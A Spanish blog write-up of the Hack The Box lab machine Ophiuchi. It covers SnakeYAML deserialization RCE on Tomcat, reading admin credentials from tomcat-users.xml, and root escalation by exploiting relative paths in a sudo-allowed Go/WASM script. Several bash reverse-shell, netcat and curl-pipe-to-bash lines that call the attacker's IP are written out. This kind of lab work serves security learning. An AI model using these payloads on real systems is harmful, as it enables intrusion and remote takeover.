---
title: "Ophiuchi - Hack The Box"
layout: single
excerpt:
show_date: true
classes: wide
header:
  teaser: "https://raw.githubusercontent.com/Wiinsad/Wiinsad.github.io/master/assets/images/machines/HTB/Ophiuchi/data/ophiuchi.png"
  teaser_home_page: true
  icon: "https://github.com/Wiinsad/Wiinsad.github.io/blob/master/assets/images/icons/Hackthebox2.png?raw=true"
categories:
  - Writeup
  - HackTheBox
tags:
  - Deserilización
  - Sudo
  - RCE
  - Linux
---

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Ophiuchi/data/HTBOphiuchi.jpg">
</p>

La máquina **Ophiuchi** es una máquina virtual vulnerable de la plataforma HackTheBox con un nivel de dificultad **medio** una calificación en el rank de 4.1, **5026 USER OWNS** y **4346 SYSTEM OWNS** con la ip **10.10.10.227** y un sistema operativo **Linux**.

## Port Scan

Para empezar, hice un escaneo con la herramienta **Nmap** para encontrar los puertos abiertos disponibles en la máquina con **[Ip:10.10.10.227]** utilizando los parámetros:
  - **-p-:**    Escaneo a toda la gama de puertos (65536).
  - **-n:**     No hacen la resolución del DNS.
  - **-T5:**    El parámetro más agresivo y ruidoso pero más rápido para hacer una exploración rápida.
  - **-v:**     Aumenta el nivel de los mensajes verbose.
  - **--open:** Muestra sólo los puertos con un estatus abierto.
  - **-oG:**    Guarda la el output en formato Grepeable.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Ophiuchi/scan/scanPort.png">
  </p>


  Una vez que hicimos el escaneo de puertos con la herramienta **ExtractPorts**, vemos que los puertos que destacaron en este caso fueron **22 y 8080**:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Ophiuchi/scan/Ports.png">
  </p>


  Una vez identificados los puertos abiertos, realizaremos un escaneo de versiones y servicios de estos puertos con la herramienta nmap configurando los siguientes parámetros:

  - **-sC:** Script de enumeración básica de sondeo en puertos y servicios alojados.
  - **-sV:** Detección de versiones en servicios alojados en puertos.
  - **-p :** Puertos a inspeccionar.
  - **-oN:** Formatos de Nmap en los que se guardará el archivo.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Ophiuchi/scan/PortServ.png">
  </p>

  Gracias al escaneo de versiones y servicios podemos ver que en el puerto **22** se aloja un servicio **ssh** y en el puerto **8080** un servicio **http apache Tomcat 9.038**, si entramos a la web con nuestro navegador podemos ver la siguiente pagina:


## Lateral Movement
  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Ophiuchi/scan/web.png">
  </p>

  La estética es bastante similar a la maquina **[Time](https://wiinsad.github.io/writeup/hackthebox/Writeup-Time/)** la cual se encuentra disponible en mi blog, investigando **Online YAML Parser** en google llegue a un articulo el cual habla como explotar una vulnerabilidad existente en este aplicativo el cual te permite ejecutar comandos. ([**articulo aquí**](https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858))

  El articulo explica como un atcante usando un ataque de deserilización de **snakeyaml** mediante la llamada a un archivo remoto el cual tieene un archivo copilado java puede ser interpretado para hacer una **RCE**.


  Leyendo el articulo y haciendo una prueba para ver si el aplicativo es vulnerable ingrese el siguiente payload.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Ophiuchi/scan/exp1.png">
  </p>

  Y efectivamente el aplicativo es vulnerable, ahora que comprobamos que es vulnerable creare la estructura para poder lograr ejecutar comando, me clone el repositorio de **[artsploit](https://github.com/artsploit/yaml-payload)** el cual ya tiene la estructura y el payload listo para modificar, en este caso ire a el archivo
**AwesomeScriptEngineFactory.java** el cual almacenara nuestro código para luego ser interpretado.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Ophiuchi/scan/exp2.png">
  </p>

  Lo que le estoy indicando es que a cuando ejecute el archivo haga un **curl** a mi maquina y descargue el archivo **winshell.sh** en la carpeta **/tmp** y una ves ahí ese archivo lo interprete con bash.

  El archivo **winshell.sh** contiene código en bash el cual entablara una **revershell** a mi maquina por el puerto **443**, este archivo lo almacenare en la raiz donde alojare mi servicio **http** con python3.

  ```
  #!/bin/bash
  bash -i >& /dev/tcp/10.10.15.125/443 0>&1
  ```

  Una vez que configure el payload procedo a compilar todo el payload con los comando:

  ```java
  javac src/artsploit/AwesomeScriptEngineFactory.java
  jar -cvf yaml-payload.jar -C src/ .
  ```

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Ophiuchi/scan/exp3.png">
  </p>

  Una vez que tengo el payload compilado procedo a ponerme en escucha por el puerto **443** con **ncat** y levantar mi servicio web con **python3**

  ```bash
  nc -lvnp 443

  python3 -m http.server 80

  ```

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Ophiuchi/intrusion/serv.png">
  </p>

  Excelente como se puede ver el código se interpreto y pude conseguir la shell con las instrucciones que le especifique en el payload del archivo **AwesomeScriptEngineFactory.java**.


  Ya dentro de la maquina veo que estoy como el usuario **Tomcat** y enumerando el sistema puedo ver que a nivel de usuarios de sistema de encuentra el usuario **admin** y en los archivo de configuración de el servicio web se puede encontrar las credenciales de este usuario ene el archivo **tomcat-users.xml**

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Ophiuchi/intrusion/passwd.png">
  </p>

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Ophiuchi/intrusion/creds.png">
  </p>

## Privilege escalation


  Ya con las credenciales del usuario **admin** y recordando que el puerto **22** esta abierto uso estas credenciales para acceder por **ssh**

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Ophiuchi/intrusion/ssh.png">
  </p>

 Podemos ver que las credenciales son validas para entrar por **ssh** y con el usuario **admin**, si enumeramos el sistema para encontrar una potencial ruta para escalar privilegios podemos ver que el usuario **admin** puede tiene permisos a nivel de sudo sin proporcionar contraseña y como el usuario **root** el siguiente permiso:

 ```bash
admin@ophiuchi:~$ sudo -l
Matching Defaults entries for admin on ophiuchi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on ophiuchi:
    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go

 ```

 Al examinar el archivo **index.go** se puede ver que la llamada de **deploy.sh** y **main.wasm** esta siendo llamadas de forma relativa por lo que a l ahora de ejecutar este comando tomaría los archivos desde la ruta en la que nos encontremos y podemos aprovechar esto para poder crear un archivo **deploy.sh** que sea ejecutado a nuestra conveniencia.

 <p align="center">
 <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Ophiuchi/intrusion/info.png">
 </p>

 Como se puede ver en el código para que a la hora de hacer el comando nos ejecute **deploy.sh** en **"main.wasm"** la instancia llamada **"info"** debe valer **1**, para comprobar si esto es así me cree un directorio en la ruta **/tmp/winsad** y ahí cree mi **deploy.sh** con el siguiente contenido:

 ```bash
 #!/bin/bash

 whoami | nc 10.10.15.125 443
 ```  

 Lo que estoy indicando es que si el archivo **main.wasm** que esta en la ruta **/opt/wasm-functions/** tiene el valor seteado de **$info** en **1** a la hora de hacer el comando con sudo me enviara un whoami a mi maquina. Para esto pase el **main.wasm** a **/tmp/winsad** con el comando cp:

```python
admin@ophiuchi:/opt/wasm-functions$ ll
total 3928
drwxr-xr-x 3 root root    4096 Oct 14  2020 ./
drwxr-xr-x 5 root root    4096 Oct 14  2020 ../
drwxr-xr-x 2 root root    4096 Oct 14  2020 backup/
-rw-r--r-- 1 root root      88 Oct 14  2020 deploy.sh
-rwxr-xr-x 1 root root 2516736 Oct 14  2020 index*
-rw-rw-r-- 1 root root     522 Oct 14  2020 index.go
-rwxrwxr-x 1 root root 1479371 Oct 14  2020 main.wasm*
admin@ophiuchi:/opt/wasm-functions$ cp main.wasm /tmp/winsad/main.wasm
admin@ophiuchi:/opt/wasm-functions$ cd /tmp/winsad/
admin@ophiuchi:/tmp/winsad$ ls
main.wasm
admin@ophiuchi:/tmp/winsad$ md5sum /opt/wasm-functions/main.wasm
25a1a35c819577d06c8cc751bf9a2ea3  /opt/wasm-functions/main.wasm
admin@ophiuchi:/tmp/winsad$ md5sum main.wasm
25a1a35c819577d06c8cc751bf9a2ea3  main.wasm

```
  Ya que tengo el binario en la ruta que me importa hago uso del comando sudo para comprobar si el binario tiene seteado ese valor en la variable **info**:

 <p align="center">
 <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Ophiuchi/intrusion/pru.png">
 </p>

Como se puede ver en **main.wasm** no esta seteado el valor una forma de cambiar esto es compartiendo me el binario a mi maquina y con la utilidad **[wabt](https://github.com/webassembly/wabt)** modificar ese valor de **main.wasm**.

Para esto me enviare el binario a mi maquina con nc.

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Ophiuchi/intrusion/com.png">
</p>

Una vez que ya esta en mi maquina con la herramienta **wasm2wat** convertimos el binario a wat para poder modificar su valor:

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Ophiuchi/intrusion/com1.png">
</p>

Ahora que tengo el **main.wat** puedo modificar el valor de **$info** para eso cambiare la  linea 4:

```bash
  before
   4   │     i32.const 0)
  after
   4   │     i32.const 1)
```
Una vez que se cambia el valor uso la herramienta **wat2wasm** y me comparto con python un servicio http en mi equipo para que desde la maquina victima con **wget** descargarme el archivo **main.wasm** modificado.

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Ophiuchi/intrusion/com2.png">
</p>

Ya con el binario modificado en mi maquina vuelvo a ejecutar el comando con **sudo** recordando que si me ejecuta el **deploy.sh** me enviar el output del **whoami** a mi maquina por el puerto 443.

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Ophiuchi/intrusion/who.png">
</p>

Como se puede ver efectivamente a la hora de ejecutar el comando con sudo me toma mis binarios ya que no están siendo llamados de forma absoluta si no relativa, por ende como veo que puedo ejecutar comando como root me entablare una shell a mi maquina modificando el archivo **deploy.sh** con el siguiente contenido:

**deploy.sh**
```bash
  #!/bin/bash

  curl http://10.10.15.125/winsad.sh | bash
```

**winsad.sh**
```bash
  #!/bin/bash

  bash -i >& /dev/tcp/10.10.15.125/443 0>%1
```
Lo que estoy indicando aquí es que haga un curl a mi maquina y lea un archivo **winsad.sh** el cual tendrá mi revershell, esto es así ya que si se lo indico directo en **deploy.sh** no te otorga la shell por alguna razón pero si se hace de esta form si me da la shell

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Ophiuchi/intrusion/shell.png">
</p>

Como se puede ver me otorga la shell como **root** así finalizando la maquina y pudiendo ir a directorio **/root/** y visualizar la flag **root.txt** de este modo finalizando esta maquina.
